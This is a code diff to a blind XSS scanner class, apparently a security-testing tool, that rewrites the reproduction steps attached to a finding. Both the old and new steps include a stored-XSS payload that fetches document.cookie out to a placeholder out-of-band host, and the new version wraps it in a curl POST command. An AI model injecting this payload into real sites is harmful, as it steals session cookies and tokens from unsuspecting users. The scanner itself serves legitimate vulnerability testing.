@@ -60,10 +60,9 @@ class BlindXSSScanner(ScannerBase):
     def generate_reproduction(self, detection: DetectionResult,
                               validation_result: ValidationResult | None = None) -> list[str]:
         return [
-            f"Submit payload at {detection.url} with blind XSS payload injected into a text input field",
-            "Blind XSS payload: <script>fetch('http://<oob-host>/exfil?c='+document.cookie)</script>",
-            "Wait for a staff/admin user to view the page containing the stored payload",
+            f"curl -X POST '{detection.url}' -d 'username=<script>fetch(\"http://<oob-host>/exfil?c=\"+document.cookie)</script>'",
             "Observe OOB callback on listener containing victim's cookies, session token, or page content — confirms stored XSS execution in victim's browser",
+            "An attacker can steal session cookies, CSRF tokens, and sensitive page content from any authenticated user (including admins) who views the affected page",
         ]
 
     def scan(self, target_urls: list[str] | None = None) -> list[Finding]:
